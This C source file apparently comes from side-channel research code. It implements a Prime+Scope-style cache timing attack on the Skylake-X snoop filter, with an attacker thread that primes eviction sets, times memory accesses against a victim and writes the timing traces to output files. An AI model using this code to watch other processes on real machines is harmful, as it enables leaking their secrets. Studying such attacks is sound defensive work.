#include "fs.h"
#include "log.h"
#include "arch.h"
#include "shared_memory.h"
#include <stdint.h>
#include "prime_probe.h"

void PS_profile_once(EVSet *evset,
                     int slot,
                     uint64_t profile_samples,
                     uint64_t max_exec_cycles,
                     uint64_t **sample_tsc,
                     uint64_t **probe_time)
{
	uint64_t tsc0, tsc1;
	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);

	u64 scope_lat, end;
	u32 aux, index = 0;
	u32 l2_repeat = 1, array_repeat = 12;
	i64 threshold = detected_cache_lats.l2_thresh;

	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);

	tsc0 = tsc1 = rdtscp();

	if (slot == 0) {
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier);
	}

	do {
		tsc1 = rdtscp();

		scope_lat = _time_maccess_aux(scope, end, aux);

		int scope_evict = scope_lat > threshold &&
		                  scope_lat < detected_cache_lats.interrupt_thresh;
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				probe_time[slot][index] = scope_lat;
				sample_tsc[slot][index] = tsc1;
				index++;
			}
			prime_skx_sf_evset_ps_flush(
			    evset, sf_chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < max_exec_cycles && index < profile_samples);

	tsc1 = rdtscp();

	if (slot == 0) {
		if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
			log_warn("Profiling time/iteration not enough");
		}
		pthread_barrier_wait(sync_ctx.barrier);
	}

	log_trace("Profiling rdtsc:\n"
	          "pid:\t%d\n"
	          "start:\t%ld\n"
	          "end:\t%ld\n"
	          "diff:\t%ld\n"
	          "index cnt:\t%ld",
	          getpid(),
	          tsc0,
	          tsc1,
	          tsc1 - tsc0,
	          index);

	return;
}

void *PS_attacker_thread(void *args)
{
	PS_attacker_thread_config_t *pt_config =
	    (PS_attacker_thread_config_t *)args;
	uint64_t tsc0, tsc1;

	EVSet *evset = pt_config->evset;
	const int slot = pt_config->slot;
	const char *test_name = pt_config->test_name;
	const char *label = pt_config->label;
	const int cache_line_count = pt_config->cache_line_count;
	const int profile_samples = pt_config->profile_samples;
	const int victim_runs = pt_config->victim_runs;
	const uint64_t max_exec_cycles = pt_config->max_exec_cycles;

	pthread_barrier_t *threads_barrier = pt_config->threads_barrier;
	uint64_t **sample_tsc = pt_config->sample_tsc;
	uint64_t **probe_time = pt_config->probe_time;

	u64 lat_goto8, lat_sar, end;
	u32 aux;
	i64 threshold = detected_cache_lats.l2_thresh;

	if (pt_config->pin_cpu != -1) {
		iso_pin_cpu(pt_config->pin_cpu);
	}

	tsc0 = rdtscp();

	for (int i = 0; i < victim_runs; ++i) {
		pthread_barrier_wait(threads_barrier);
		if (slot == 0) {
			memset(probe_time[slot], 0, sizeof(probe_time[0]));
			memset(sample_tsc[slot], 0, sizeof(sample_tsc[0]));
		}

		PS_profile_once(evset,
		                slot,
		                profile_samples,
		                max_exec_cycles,
		                sample_tsc,
		                probe_time);

		if (slot == 0) {
			dump_profiling_traces(test_name,
			                      victim_runs,
			                      sample_tsc,
			                      probe_time,
			                      cache_line_count,
			                      profile_samples,
			                      i == 0);
		}
	}

	tsc1 = rdtscp();

	return NULL;
}

void dump_profiling_trace(const char *dump_prefix,
                          int dump_id,
                          uint64_t **sample_tsc,
                          uint64_t **reload_time,
                          int cl_cnt,
                          int sp_cnt)
{
	static int trace_idx = 0;
	char output_dir[256], output_file[256];

	sprintf(output_dir, "output/%s", dump_prefix);
	create_directory(output_dir);

	FILE *fp;
	sprintf(output_file, "%s/r%d.out", output_dir, dump_id);
	fp = fopen(output_file, "w");
	if (fp == NULL) {
		log_error("Error opening output file %s", output_file);
		return;
	}
	log_info("Dump trace to %s", output_file);

	for (int i = 0; i < sp_cnt; ++i) {
		for (int j = 0; j < cl_cnt; ++j) {
			fprintf(fp, "%lu:%lu\t", sample_tsc[j][i], reload_time[j][i]);
			sample_tsc[j][i] = reload_time[j][i] = 0;
		}
		fprintf(fp, "\n");
	}
	fclose(fp);
}

void dump_profiling_traces(const char *dump_prefix,
                           int victim_runs,
                           uint64_t **sample_tsc,
                           uint64_t **reload_time,
                           int cl_cnt,
                           int sp_cnt,
                           int reset)
{
	static int trace_idx = 0;
	char output_dir[256], output_file[256];

	if (reset) {
		trace_idx = 0;
	}

	sprintf(output_dir, "output/%s_r%05d", dump_prefix, victim_runs);
	if (trace_idx == 0) {
		create_directory(output_dir);
	}

	FILE *fp;
	sprintf(output_file, "%s/r%d.out", output_dir, trace_idx++);
	fp = fopen(output_file, "w");
	if (fp == NULL) {
		log_error("Error opening output file %s", output_file);
		return;
	}
	log_info("Dump trace to %s", output_file);

	for (int i = 0; i < sp_cnt; ++i) {
		for (int j = 0; j < cl_cnt; ++j) {
			fprintf(fp, "%lu:%lu\t", sample_tsc[j][i], reload_time[j][i]);
			sample_tsc[j][i] = reload_time[j][i] = 0;
		}
		fprintf(fp, "\n");
	}
	fclose(fp);
}
